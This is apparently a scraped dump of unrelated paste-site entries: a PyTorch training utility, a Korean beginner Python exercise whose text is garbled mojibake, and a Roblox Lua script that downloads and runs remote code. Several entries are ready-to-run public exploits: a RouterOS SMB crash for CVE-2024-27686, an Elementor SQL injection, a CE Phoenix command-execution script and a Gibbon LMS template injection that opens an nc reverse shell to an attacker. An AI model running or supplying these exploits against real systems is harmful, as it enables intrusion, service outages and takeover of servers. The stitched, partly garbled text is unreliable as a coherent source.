    main(3)
"
bgJpLBYL,nousig K,suramraja1,Lua,Monday 8th of April 2024 12:10:42 AM CDT,"_G.key = ""2c919f8419c74017a3d6665cd9003a5e""

loadstring(game:HttpGet(""https://nousigi.com/loader.lua""))()

coroutine.wrap(function()
    task.wait(1)
    game:GetService(""GuiService"").ErrorMessageChanged:Connect(function()
        task.wait (1) game:GetService(""TeleportService""):Teleport(game.PlaceId)
    end); 
end)()

coroutine.wrap(function()
    pcall(function()
        task.wait(10)
        game:service'VirtualInputManager':SendKeyEvent(true, ""Tab"", false, game)
        task.wait(66)
        game:GetService(""RunService""):Set3dRenderingEnabled(false)
    end)
end)()"
gq8X99Wk,Utility Scripts,yontenvision,Python,Monday 8th of April 2024 12:06:57 AM CDT,"import albumentations as A
import cv2
import numpy as np
import torch
import matplotlib.pyplot as plt

from albumentations.pytorch import ToTensorV2

plt.style.use('ggplot')

# This class keeps track of the training and validation loss values
# and helps to get the average for each epoch as well.
class Averager:
  def __init__(self):
    self.current_total = 0.0
    self.iterations = 0.0

  def send(self, value):
    self.current_total += value
    self.iterations += 1

  @property
  def value(self):
    if self.iterations == 0:
      return 0
    else:
      return 1.0 * self.current_total / self.iterations

  def reset(self):
    self.current_total = 0.0
    self.iterations = 0.0

class SaveBestModel:
  """"""
  Class to save the best model while training. If the current epoch's
  validation mAP @0.5:0.95 IoU higher than the previous highest, then save the
  model state.
  """"""
  def __init__(
    self, best_valid_map=float(0)
  ):
    self.best_valid_map = best_valid_map

  def __call__(
    self,
    model,
    current_valid_map,
    epoch,
    OUT_DIR,
  ):

    if current_valid_map > self.best_valid_map:
      self.best_valid_map = current_valid_map
      print(f""\nBEST VALIDATION mAP: {self.best_valid_map}"")
      print(f""\nSAVING BEST MODEL FOR EPOCH: {epoch+1}\n"")
      torch.save({
        'epoch': epoch+1,
        'model_state_dict': model.state_dict(),
      }, f""{OUT_DIR}/best_model.pth"")

def collate_fn(batch):
  """"""
  To handle the data loading as different images may have different number
  of objects and to handle varying size tensors as well.
  """"""
  return tuple(zip(*batch))

# Define the training tranforms.
def get_train_transform():
  return A.Compose([
    A.Blur(blur_limit=3, p=0.1),
    A.MotionBlur(blur_limit=3, p=0.1),
    A.MedianBlur(blur_limit=3, p=0.1),
    A.ToGray(p=0.3),
    A.RandomBrightnessContrast(p=0.3),
    A.ColorJitter(p=0.3),
    A.RandomGamma(p=0.3),
    ToTensorV2(p=1.0),
  ], bbox_params={
    'format': 'pascal_voc',
    'label_fields': ['labels']
  })

# Define the validation transforms.
def get_valid_transform():
  return A.Compose([
    ToTensorV2(p=1.0),
  ], bbox_params={
    'format': 'pascal_voc',
    'label_fields': ['labels']
  })

def show_tranformed_image(train_loader):
  """"""
  This function shows the transformed images from the `train_loader`.
  Helps to check whether the tranformed images along with the corresponding
  labels are correct or not.
  Only runs if `VISUALIZE_TRANSFORMED_IMAGES = True` in config.py.
  """"""
  if len(train_loader) > 0:
    for i in range(1):
      images, targets = next(iter(train_loader))
      images = list(image.to(DEVICE) for image in images)
      targets = [{k: v.to(DEVICE) for k, v in t.items()} for t in targets]
      boxes = targets[i]['boxes'].cpu().numpy().astype(np.int32)
      labels = targets[i]['labels'].cpu().numpy().astype(np.int32)
      sample = images[i].permute(1, 2, 0).cpu().numpy()
      sample = cv2.cvtColor(sample, cv2.COLOR_RGB2BGR)
      for box_num, box in enumerate(boxes):
        cv2.rectangle(sample,
                  (box[0], box[1]),
                  (box[2], box[3]),
                  (0, 0, 255), 2)
        cv2.putText(sample, CLASSES[labels[box_num]],
                  (box[0], box[1]-10), cv2.FONT_HERSHEY_SIMPLEX,
                  1.0, (0, 0, 255), 2)
        # cv2.imshow('Transformed image', sample)
            # cv2.waitKey(0)
        cv2_imshow(sample)
        cv2.destroyAllWindows()

def save_model(epoch, model, optimizer):
  """"""
  Function to save the trained model till current epoch, or whenver called
  """"""
  torch.save({
              'epoch': epoch+1,
              'model_state_dict': model.state_dict(),
              'optimizer_state_dict': optimizer.state_dict(),
              }, 'outputs/last_model.pth')

def save_loss_plot(
  OUT_DIR,
  train_loss_list,
  x_label='iterations',
  y_label='train loss',
    save_name='train_loss'
):
  """"""
  Function to save both train loss graph.

  :param OUT_DIR: Path to save the graphs.
  :param train_loss_list: List containing the training loss values.
  """"""
  figure_1 = plt.figure(figsize=(10, 7), num=1, clear=True)
  train_ax = figure_1.add_subplot()
  train_ax.plot(train_loss_list, color='tab:blue')
  train_ax.set_xlabel(x_label)
  train_ax.set_ylabel(y_label)
  figure_1.savefig(f""{OUT_DIR}/{save_name}.png"")
  print('SAVING PLOTS COMPLETE...')

def save_mAP(OUT_DIR, map_05, map):
  """"""
  Saves the mAP@0.5 and mAP@0.5:0.95 per epoch.
  :param OUT_DIR: Path to save the graphs.
  :param map_05: List containing mAP values at 0.5 IoU.
  :param map: List containing mAP values at 0.5:0.95 IoU.
  """"""
  figure = plt.figure(figsize=(10, 7), num=1, clear=True)
  ax = figure.add_subplot()
  ax.plot(
      map_05, color='tab:orange', linestyle='-',
      label='mAP@0.5'
  )
  ax.plot(
      map, color='tab:red', linestyle='-',
      label='mAP@0.5:0.95'
  )
  ax.set_xlabel('Epochs')
  ax.set_ylabel('mAP')
  ax.legend()
  figure.savefig(f""{OUT_DIR}/map.png"")"
ZWhSqvSV,RouterOS 6.40.5 - 6.44 and 6.48.1 - 6.49.10 - Denial of Service - CVE-2024-27686,FlyFar,Python,Sunday 7th of April 2024 11:50:16 PM CDT,"# Exploit Title: CVE-2024-27686: RouterOS-SMB-DOS
# Google Dork: N/A
# Date: 03/04/2024
# Exploit Author: ice-wzl, Solstice Cyber Solutions
# Vendor Homepage: https://mikrotik.com/
# Software Link: https://mikrotik.com/download/archive
# Version: RouterOS devices ranging from 6.40.5 - 6.44 and 6.48.1 - 6.49.10
# Tested on: RouterOS 6.40.5 - 6.44 and 6.48.1 - 6.49.10
# CVE : CVE-2024-27686
#!/usr/bin/python3 
# Founded by ice-wzl in conjunction with Solstice Cyber Solutions
import argparse
import sys
import socket 
# Define the packets

# the packet that causes crash 6.40.5 - 6.42.3
fuzzed_packet_6 = b'\x00\x00\x00n\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x03\x00\xf1\x1f\x08\x00\x00\x00\x00\x00\x00\xe1\xbe\x82\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00G\xe5\x07\xf5\x07\xec\x01u\xe4Q]\x9e\xea\xedn\xa9\t\x00\x00\x00H\x00&\x00\\\x00\\\x001\x009\x002\x00.\x001\x006\x008\x00.\x001\x005\x00.\x007\x007\x00\\\x00p\x00u\x00b\x00'


packet_0 = b'\x00\x00\x00\xea\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x05\x00\x01\x00\x00\x00\x7f\x00\x00\x00\xe8\xe4*\x99\xc9\xeb\xb6E\xa2A\xe9(\xee%\xe5\xdfp\x00\x00\x00\x04\x00\x00\x00\x02\x02\x10\x02\x00\x03\x02\x03\x11\x03\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00_\xf7m\xf2h*\x8f\x8ae\x0f8+T=Na8_\x0b@C\x82\xe7\x87\xc3qZ\xd7\xcf0M\x87\x00\x00\x02\x00\n\x00\x00\x00\x00\x00\x04\x00\x02\x00\x01\x00\x04\x00\x03\x00\x00\x00\x00\x00\x00\x00\x08\x00\x08\x00\x00\x00\x00\x00\x03\x00\x02\x00\x01\x00\x00\x00\x05\x00\x1a\x00\x00\x00\x00\x001\x009\x002\x00.\x001\x006\x008\x00.\x001\x005\x00.\x008\x004\x00'
packet_2_fuzzed = b'\x00\x00\x00\xa2\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00X\x00J\x00\x00\x00\x00\x00\x00\x00\x00\x00`H\x05\x06+\x06\x01\x05\x05\x02\xa0>0<\xa0\x0e21540373\xed\xba\xad211\x0c\x06\n+\x06\x01\x04\x01\x82294517887446830\x02\x02\n\xa2*\x04(NTLMSSP\x00\x01\x00\x00\x00\x15\x82\x08b\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x06\x01\x00\x00\x00\x00\x00\x0f'


def open_connection(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        return s
    except ConnectionRefusedError:
        print(f""[!] Connection Refused on: {ip} {port}"")
        sys.exit(2)

def send_payload_high(s):
    s.send(packet_0)
    s.send(packet_2_fuzzed)
    s.close()

def send_payload_low(s):
    s.send(fuzzed_packet_6)
    s.close()

def verify_input(user_inp):
    try:
        user_inp = int(user_inp)
        if user_inp > 2 or user_inp < 1:
            return 3
        else:
            return user_inp
    except ValueError:
        return 0

if __name__ == '__main__':

    parser = argparse.ArgumentParser(prog='SMB Crash',
        description='Crashes Mikrotik RouterOS SMB Service 6.40.5 - 6.49.10',
        epilog='Discovered by: ice-wzl')

    parser.add_argument(""-t"", ""--target"", action=""store"", dest=""target"")
    parser.add_argument(""-p"", ""--port"", action=""store"", dest=""port"")

    args = parser.parse_args()
    
    if not args.target or not args.port:
        print(f""[+] python3 {sys.argv[0]} --help"")
        sys.exit(1)

    print(""[+] What version is the target:\n\t[1] 6.40.5 - 6.44\n\t[2] 6.48.1 - 6.49.10\nEnter 1 or 2:"")
    version_choice = input(""--> "")

    if verify_input(version_choice) == 0:
        print(""Please enter a number..."")
        sys.exit(3)
    elif verify_input(version_choice) == 3:
        print(""Please enter a number between 1 and 2"")
        sys.exit(4)

    if verify_input(version_choice) == 1:
        if args.port:
            get_connect = open_connection(args.target, int(args.port))
            send_payload_low(get_connect)
            print(f""[+] Sent DOS to {args.target} on {args.port}"")
        else:
            get_connect = open_connection(args.target, 445)
            send_payload_low(get_connect)
            print(f""[+] Sent DOS to {args.target} on 445"")  
    
    if verify_input(version_choice) == 2:
        if args.port:
            get_connect = open_connection(args.target, int(args.port))
            send_payload_high(get_connect)
            print(f""[+] Sent DOS to {args.target} on {args.port}"")

        else:
            get_connect = open_connection(args.target, 445)
            send_payload_high(get_connect)
            print(f""[+] Sent DOS to {args.target} on 445"")
            "
WSKQjLLx,Elementor Website Builder < 3.12.2 - Admin+ SQLi,FlyFar,Python,Sunday 7th of April 2024 11:46:13 PM CDT,"#EXPLOIT Elementor Website Builder < 3.12.2 - Admin+ SQLi
#References
#CVE : CVE-2023-0329
#E1.Coders
 
#Open Burp Suite.
#In Burp Suite, go to the ""Proxy"" tab and set it to listen on a specific port, such as 8080.
#Open a new browser window or tab, and set your proxy settings to use Burp Suite on port 8080.
#Visit the vulnerable Elementor Website Builder site and navigate to the Tools > Replace URL page.
#On the Replace URL page, enter any random string as the ""New URL"" and the following malicious payload as the ""Old URL"":
 
#code : http://localhost:8080/?test'),meta_key='key4'where+meta_id=SLEEP(2);#
#Press ""Replace URL"" on the Replace URL page. Burp Suite should intercept the request.
#Forward the intercepted request to the server by right-clicking the request in Burp Suite and selecting ""Forward"".
#The server will execute the SQL command, which will cause it to hang for 2 seconds before responding. This is a clear indication of successful SQL injection.
#Note: Make sure you have permission to perform these tests and have set up Burp Suite correctly. This command may vary depending on the specific setup of your server and the website builder plugin.</s
# 
#References :  https://wpscan.com/vulnerability/a875836d-77f4-4306-b275-2b60efff1493/
 
 
 
 
#Exploit Python  :
#The provided SQLi attack vector can be achieved using the following Python code with the ""requests"" library:
 
#This script sends a POST request to the target URL with the SQLi payload as the ""data"" parameter. It then checks if the response contains the SQLi payload, indicating a successful SQL injection.
#Please make sure you have set up your Burp Suite environment correctly. Additionally, it is important to note that this script and attack have been TESTED and are correct
 
import requests
 
# Set the target URL and SQLi payload
url = ""http://localhost:8080/wp-admin/admin-ajax.php""
data = {
    ""action"": ""elementor_ajax_save_builder"",
    ""editor_post_id"": ""1"",
    ""post_id"": ""1"",
    ""data"": ""test'),meta_key='key4'where+meta_id=SLEEP(2);#""
}
 
# Send the request to the target URL
response = requests.post(url, data=data)
 
# Check if the response indicates a successful SQL injection
if ""meta_key='key4'where+meta_id=SLEEP(2);#"" in response.text:
    print(""SQL Injection successful!"")
else:
    print(""SQL Injection failed."")
            "
VzPm3dHi,CE Phoenix v1.0.8.20 - Remote Code Execution,FlyFar,Python,Sunday 7th of April 2024 11:45:23 PM CDT,"## Exploit Title: CE Phoenix v1.0.8.20 - Remote Code Execution (RCE) (Authenticated)
#### Date: 2023-11-25
#### Exploit Author: tmrswrr
#### Category: Webapps
#### Vendor Homepage: [CE Phoenix](https://phoenixcart.org/)
#### Version: v1.0.8.20
#### Tested on: [Softaculous Demo - CE Phoenix](https://www.softaculous.com/apps/ecommerce/CE_Phoenix)

## EXPLOIT :

import requests
from bs4 import BeautifulSoup
import sys
import urllib.parse
import random
from time import sleep

class colors:
    OKBLUE = '\033[94m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    CBLACK = '\33[30m'
    CRED = '\33[31m'
    CGREEN = '\33[32m'
    CYELLOW = '\33[33m'
    CBLUE = '\33[34m'
    CVIOLET = '\33[35m'
    CBEIGE = '\33[36m'
    CWHITE = '\33[37m'

 
def entry_banner():
    color_random = [colors.CBLUE, colors.CVIOLET, colors.CWHITE, colors.OKBLUE, colors.CGREEN, colors.WARNING,
                    colors.CRED, colors.CBEIGE]
    random.shuffle(color_random)

    banner = color_random[0] + """"""
     CE Phoenix v1.0.8.20 - Remote Code Execution \n
     Author: tmrswrr
    """"""
    for char in banner:
        print(char, end='')
        sys.stdout.flush()
        sleep(0.0045)

def get_formid_and_cookies(session, url):
    response = session.get(url, allow_redirects=True)
    if response.ok:
        soup = BeautifulSoup(response.text, 'html.parser')
        formid_input = soup.find('input', {'name': 'formid'})
        if formid_input:
            return formid_input['value'], session.cookies
    return None, None

def perform_exploit(session, url, username, password, command):
    print(""\n[+] Attempting to exploit the target..."")

   
    initial_url = url + ""/admin/define_language.php?lngdir=english&filename=english.php""
    formid, cookies = get_formid_and_cookies(session, initial_url)
    if not formid:
        print(""[-] Failed to retrieve initial formid."")
        return

    # Login
    print(""[+] Performing login..."")
    login_payload = {
        'formid': formid,
        'username': username,
        'password': password
    }
    login_headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': f'cepcAdminID={cookies[""cepcAdminID""]}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36',
        'Referer': initial_url
    }
    login_url = url + ""/admin/login.php?action=process""
    login_response = session.post(login_url, data=login_payload, headers=login_headers, allow_redirects=True)

    if not login_response.ok:
        print(""[-] Login failed."")
        print(login_response.text)
        return

    print(""[+] Login successful."")


    new_formid, _ = get_formid_and_cookies(session, login_response.url)
    if not new_formid:
        print(""[-] Failed to retrieve new formid after login."")
        return

    # Exploit
    print(""[+] Executing the exploit..."")
    encoded_command = urllib.parse.quote_plus(command)
    exploit_payload = f""formid={new_formid}&file_contents=%3C%3Fphp+echo+system%28%27{encoded_command}%27%29%3B""
    exploit_headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': f'cepcAdminID={cookies[""cepcAdminID""]}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36',
        'Referer': login_response.url
    }
    exploit_url = url + ""/admin/define_language.php?lngdir=english&filename=english.php&action=save""
    exploit_response = session.post(exploit_url, data=exploit_payload, headers=exploit_headers, allow_redirects=True)

    if exploit_response.ok:
        print(""[+] Exploit executed successfully."")
    else:
        print(""[-] Exploit failed."")
        print(exploit_response.text)

    
    final_response = session.get(url)
    print(""\n[+] Executed Command Output:\n"")
    print(final_response.text)  

def main(base_url, username, password, command):
    print(""\n[+] Starting the exploitation process..."")
    session = requests.Session()
    perform_exploit(session, base_url, username, password, command)

if __name__ == ""__main__"":
    entry_banner()

    if len(sys.argv) < 5:
        print(""Usage: python script.py [URL] [username] [password] [command]"")
        sys.exit(1)

    base_url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    command = sys.argv[4]

    main(base_url, username, password, command)
            "
fBhCuP33,Gibbon LMS v26.0.00 - SSTI vulnerability - CVE-2024-24724,FlyFar,Python,Sunday 7th of April 2024 11:41:33 PM CDT,"# Exploit Title: Gibbon LMS v26.0.00 - SSTI vulnerability
# Date: 21.01.2024
# Exploit Author: SecondX.io Research Team(Islam Rzayev,Fikrat Guliev, Ali Maharramli)
# Vendor Homepage: https://gibbonedu.org/
# Software Link: https://github.com/GibbonEdu/core
# Version: v26.0.00
# Tested on: Ubuntu 22.0
# CVE : CVE-2024-24724

import requests
import re
import sys


def login(target_host, target_port,email,password):
     url = f'http://{target_host}:{target_port}/login.php?timeout=true'
     headers = {""Content-Type"": ""multipart/form-data; 
boundary=---------------------------174475955731268836341556039466""}
     data = 
f""-----------------------------174475955731268836341556039466\r\nContent-Disposition: 
form-data; 
name=\""address\""\r\n\r\n\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: 
form-data; 
name=\""method\""\r\n\r\ndefault\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: 
form-data; 
name=\""username\""\r\n\r\n{email}\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: 
form-data; 
name=\""password\""\r\n\r\n{password}\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: 
form-data; 
name=\""gibbonSchoolYearID\""\r\n\r\n025\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: 
form-data; 
name=\""gibboni18nID\""\r\n\r\n0002\r\n-----------------------------174475955731268836341556039466--\r\n""
     r = requests.post(url, headers=headers, data=data, 
allow_redirects=False)
     Session_Cookie = re.split(r""\s+"", r.headers['Set-Cookie'])
     if Session_Cookie[4] is not None and '/index.php' in 
str(r.headers['Location']):
         print(""login successful!"")

     return Session_Cookie[4]



def rce(cookie, target_host, target_port, attacker_ip, attacker_port):
     url = 
f'http://{target_host}:{target_port}/modules/School%20Admin/messengerSettingsProcess.php'
     headers = {""Content-Type"": ""multipart/form-data; 
boundary=---------------------------67142646631840027692410521651"", 
""Cookie"": cookie}
     data = 
f""-----------------------------67142646631840027692410521651\r\nContent-Disposition: 
form-data; name=\""address\""\r\n\r\n/modules/School 
Admin/messengerSettings.php\r\n-----------------------------67142646631840027692410521651\r\nContent-Disposition: 
form-data; 
name=\""enableHomeScreenWidget\""\r\n\r\nY\r\n-----------------------------67142646631840027692410521651\r\nContent-Disposition: 
form-data; name=\""signatureTemplate\""\r\n\r\n{{{{[\'rm /tmp/f;mkfifo 
/tmp/f;cat /tmp/f|sh -i 2>&1|nc {attacker_ip} {attacker_port} 
 >/tmp/f']|filter('system')}}}}\r\n-----------------------------67142646631840027692410521651\r\nContent-Disposition: form-data; name=\""messageBcc\""\r\n\r\n\r\n-----------------------------67142646631840027692410521651\r\nContent-Disposition: form-data; name=\""pinnedMessagesOnHome\""\r\n\r\nN\r\n-----------------------------67142646631840027692410521651--\r\n""
     r = requests.post(url, headers=headers, data=data, 
allow_redirects=False)
     if 'success0' in str(r.headers['Location']):
         print(""Payload uploaded successfully!"")



def trigger(cookie, target_host, target_port):
     url = 
f'http://{target_host}:{target_port}/index.php?q=/modules/School%20Admin/messengerSettings.php&return=success0'
     headers = {""Cookie"": cookie}
     print(""RCE successful!"")
     r = requests.get(url, headers=headers, allow_redirects=False)


if __name__ == '__main__':
     if len(sys.argv) != 7:
         print(""Usage: script.py <target_host> <target_port> 
<attacker_ip> <attacker_port> <email> <password>"")
         sys.exit(1)
     cookie = login(sys.argv[1], sys.argv[2],sys.argv[5],sys.argv[6])
     rce(cookie, sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
     trigger(cookie, sys.argv[1], sys.argv[2])
            "
3CeHrfNj,0408 ÎØ∏ÏÖò 1,NotoriousH2,Python,Sunday 7th of April 2024 10:29:17 PM CDT,"from smart_home import Contact, example_heater, example_phone

# Problem 1
# ÌòÑÏû¨ Ïò®ÎèÑÏôÄ ÏÑ§Ï†ï Ïò®ÎèÑÎ•º ÎπÑÍµêÌï¥, ÌòÑÏû¨ Ïò®ÎèÑÍ∞Ä Îçî ÎÇÆÏùÑ Í≤ΩÏö∞ ÌûàÌÑ∞Î•º ÏºúÍ≥†, ÏïÑÎãàÎùºÎ©¥ ÌûàÌÑ∞Î•º ÎÅïÎãàÎã§.
def control_heater(heater):
    # ÌòÑÏû¨ Ïò®ÎèÑÎ•º ÏùΩÏñ¥ ÏòµÎãàÎã§.
    current = heater.current_temperature
    # ÏÇ¨Ïö©ÏûêÍ∞Ä ÏÑ§Ï†ïÌïú Î™©Ìëú Ïò®ÎèÑÎ•º ÏùΩÏñ¥ ÏòµÎãàÎã§.
    preferred = heater.preferred_temperature

    # Î∂ÄÎì±Ìò∏ ÏàòÏ†ï 
    if preferred > current:
        heater.turn_on()
    else:
        heater.turn_off()


# Problem 2
# ÏÑ≠Ïî® Ïò®ÎèÑÎ•º ÌôîÏî® Ïò®ÎèÑÎ°ú Î≥ÄÌôòÌï©ÎãàÎã§.
def celsius_to_fahrenheit(celsius):
    fahrenheit = (celsius * 1.8) + 32
    # Ïò§ÌÉÄ ÏàòÏ†ï
    return fahrenheit


# Problem 3
# ÌòÑÏû¨ Ïò®ÎèÑ Ï†ïÎ≥¥Î•º ÌÖçÏä§Ìä∏Î°ú ÌëúÏãúÌï©ÎãàÎã§.
# ÌÖçÏä§Ìä∏ÏóêÎäî ÏÑ≠Ïî®ÏôÄ ÌôîÏî® Ïò®ÎèÑ, ÌûàÌÑ∞Ïùò ÏºúÏßê/Í∫ºÏßê Ïó¨Î∂ÄÍ∞Ä Ìè¨Ìï®Îê©ÎãàÎã§.
def read_temperature(heater):
    # ÌòÑÏû¨ Ïò®ÎèÑ(ÏÑ≠Ïî®) Ï†ïÎ≥¥Î•º Î∂àÎü¨ÏòµÎãàÎã§.
    # ÏïÑÎûò NoneÏùÑ ÏßÄÏö∞Í≥† ÏΩîÎìúÎ•º ÏôÑÏÑ±Ìï¥ Ï£ºÏÑ∏Ïöî.
    celsius = heater.current_temperature

    # ÌôîÏî®Î°ú Î≥ÄÌôòÌï©ÎãàÎã§.
    # ÏïÑÎûò NoneÏùÑ ÏßÄÏö∞Í≥† ÏΩîÎìúÎ•º ÏôÑÏÑ±Ìï¥ Ï£ºÏÑ∏Ïöî.
    fahrenheit = celsius_to_fahrenheit(celsius)

    # ÌûàÌÑ∞Ïùò ÏºúÏßê Ïó¨Î∂ÄÎ•º ÎÇòÌÉÄÎÇ¥Îäî ÌÖçÏä§Ìä∏Î•º Í≤∞Ï†ïÌï©ÎãàÎã§.
    if heater.is_turned_on:
        is_turned_on_text = ""ÏºúÏ†∏""
    else:
        is_turned_on_text = ""Í∫ºÏ†∏""
    # celsiusÏôÄ fahrenheitÎäî Î¨∏ÏûêÏó¥Ïù¥ ÏïÑÎãàÎØÄÎ°ú ÏàòÏ†ï
    return ""ÌòÑÏû¨ Ïò®ÎèÑÎäî ÏÑ≠Ïî® "" + str(celsius) + ""ÎèÑ, ÌôîÏî® "" + str(fahrenheit) + ""ÎèÑÏûÖÎãàÎã§. ÌûàÌÑ∞Í∞Ä "" + is_turned_on_text + "" ÏûàÏäµÎãàÎã§.""


# Problem 4
# Îã®Ï∂ïÎ≤àÌò∏Î•º Ïù¥Ïö©Ìï¥, Ï†ÄÏû•Îêú Ïó∞ÎùΩÏ≤òÏùò quick_number Ïù∏Îç±Ïä§Ïùò ÏÇ¨ÎûåÏóêÍ≤å Ï†ÑÌôîÎ•º Í≤ÅÎãàÎã§.
# Ï†ÑÌôîÎ•º Í±¥ Îí§ ÏÇ¨Ïö©ÏûêÏóêÍ≤å Î≥¥Ïó¨Ï§Ñ Î©îÏãúÏßÄÎ•º Î¶¨ÌÑ¥Ìï©ÎãàÎã§.
# Ìï¥Îãπ Î≤àÌò∏Ïóê Ï†ÄÏû•Îêú ÏÇ¨ÎûåÏù¥ ÏóÜÏùÑ Í≤ΩÏö∞ NoneÏùÑ Î¶¨ÌÑ¥Ìï©ÎãàÎã§.
def quick_dial(phone, quick_number):
    # Îã®Ï∂ïÎ≤àÌò∏ Î™©Î°ùÏóêÏÑú quick_number Ïù∏Îç±Ïä§Ïùò Ïó∞ÎùΩÏ≤òÎ•º Ï∞æÏäµÎãàÎã§.
    # quick_numberÍ∞Ä 9Ïùº Îïå ÏóêÎü¨Í∞Ä Î∞úÏÉùÌïòÎØÄÎ°ú, try except Íµ¨Î¨∏ Ï∂îÍ∞Ä
    try:
        contact = phone.saved_contacts[quick_number]
    except:
        return None

    # Ï∞æÏùÄ Ï†ÑÌôîÎ≤àÌò∏Ïóê Ï†ÑÌôîÎ•º Í≤ÅÎãàÎã§.
    phone.dial(contact.phone_number)

    # ÏÇ¨Ïö©ÏûêÏóêÍ≤å ÏïåÎ†§Ï£ºÎäî Î©îÏãúÏßÄÎ•º Î¶¨ÌÑ¥Ìï©ÎãàÎã§.
    return f""{contact.name}ÎãòÏóêÍ≤å Ï†ÑÌôîÎ•º Í±∏Í≥† ÏûàÏäµÎãàÎã§.""


# Problem 5
# ÏÉàÎ°úÏö¥ ÏÇ¨ÎûåÏùÑ Îã®Ï∂ïÎ≤àÌò∏Ïóê Îì±Î°ùÌï©ÎãàÎã§. Îã®Ï∂ïÎ≤àÌò∏Îäî Ï†ÄÏû•Îêú ÏàúÏÑúÎåÄÎ°ú ÏûêÎèô ÏßÄÏ†ïÎê©ÎãàÎã§.
def save_contact(phone, name, phone_number):
    # ÏÉàÎ°úÏö¥ Ïó∞ÎùΩÏ≤òÎ•º ÏÉùÏÑ±Ìï©ÎãàÎã§.
    contact = Contact(name, phone_number)
    # Îã®Ï∂ïÎ≤àÌò∏ Î™©Î°ùÏóê Ïó∞ÎùΩÏ≤òÎ•º Ï∂îÍ∞ÄÌï©ÎãàÎã§.
    phone.saved_contacts.append(contact)


def main():
    # Ìï®Ïàò Í≤ÄÏ¶ùÏùÑ Ìï©ÎãàÎã§.
    # ÌïÑÏöîÏóê Îî∞Îùº Îçî ÎßéÏùÄ ÌÖåÏä§Ìä∏Î•º Ï∂îÍ∞ÄÌï† Ïàò ÏûàÏäµÎãàÎã§.

    # control_heaterÎ•º ÌÖåÏä§Ìä∏Ìï©ÎãàÎã§.
    example_heater.current_temperature = -1.0
    control_heater(example_heater)

    # assert : Ï°∞Í±¥ÏùÑ ÌÖåÏä§Ìä∏ÌïòÍ≥† Ï∞∏Ïù¥Î©¥ Í∑∏ÎåÄÎ°ú ÌïòÍ≥†, Í±∞ÏßìÏù¥Î©¥ ÏóêÎü¨Î•º Î∞úÏÉùÏãúÏºúÎùº
    assert example_heater.is_turned_on == True

    # celsius_to_fahrenheitÎ•º ÌÖåÏä§Ìä∏Ìï©ÎãàÎã§.
    assert celsius_to_fahrenheit(100) == 212

    # read_temperatureÎ•º ÌÖåÏä§Ìä∏Ìï©ÎãàÎã§.
    assert (
        read_temperature(example_heater) == ""ÌòÑÏû¨ Ïò®ÎèÑÎäî ÏÑ≠Ïî® -1.0ÎèÑ, ÌôîÏî® 30.2ÎèÑÏûÖÎãàÎã§. ÌûàÌÑ∞Í∞Ä ÏºúÏ†∏ ÏûàÏäµÎãàÎã§.""
    )

    # save_contact Î∞è quick_dialÏùÑ ÌÖåÏä§Ìä∏Ìï©ÎãàÎã§.
    save_contact(example_phone, ""ÏóòÎ¶¨Ïä§ ÌÜ†ÎÅº"", ""01010101010"")
    save_contact(example_phone, ""Ï≤¥ÏÖî Í≥†ÏñëÏù¥"", ""01056785678"")
    assert quick_dial(example_phone, 0) == ""ÏóòÎ¶¨Ïä§ ÌÜ†ÎÅºÎãòÏóêÍ≤å Ï†ÑÌôîÎ•º Í±∏Í≥† ÏûàÏäµÎãàÎã§.""
    assert quick_dial(example_phone, 1) == ""Ï≤¥ÏÖî Í≥†ÏñëÏù¥ÎãòÏóêÍ≤å Ï†ÑÌôîÎ•º Í±∏Í≥† ÏûàÏäµÎãàÎã§.""
    assert quick_dial(example_phone, 9) == None


# ÌîÑÎ°úÍ∑∏Îû®Ïù¥ ÏßÄÍ∏à Îßâ ÏãúÏûëÌñàÏúºÎ©¥
# main()Ïù¥ÎùºÎäî Ìï®ÏàòÎ•º Ïã§Ìñâ
if __name__ == ""__main__"":
    main()

# Class ÏòàÏãú
# ContantÎäî nameÍ≥º phone_numberÎ•º ÏûÖÎ†•ÏúºÎ°ú Î∞õÏùå
X= Contact('HH','010')
print(X.name) # HH
print(X.phone_number) # 010

# example_heater = Heater()
# example_heaterÎäî ÏïÑÎûòÏùò Í∞íÎì§Ïù¥ Ï°¥Ïû¨ÌïòÎäî ÏÉÅÌÉú
# is_turned_on = False, current_temperature = 0.0
# preferred_temperature = 0.0, turn_on(), turn_off() 
# ex) example_heater.current_temperature --> 0.0

# example_phone = Phone()

